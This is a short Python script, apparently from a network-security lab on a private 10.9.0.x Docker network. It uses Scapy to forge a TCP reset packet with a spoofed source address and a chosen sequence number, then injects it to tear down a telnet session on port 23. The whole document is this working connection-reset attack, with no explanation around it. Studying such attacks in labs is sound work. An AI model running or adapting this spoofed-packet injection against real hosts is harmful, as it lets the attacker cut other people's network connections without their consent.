#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.7", dst="10.9.0.5")
tcp = TCP(sport=49714, dport=23, flags="R", seq=1233915195)
pkt = ip/tcp
ls(pkt)
send(pkt, iface="br-3e5f42528ad9", verbose=0)
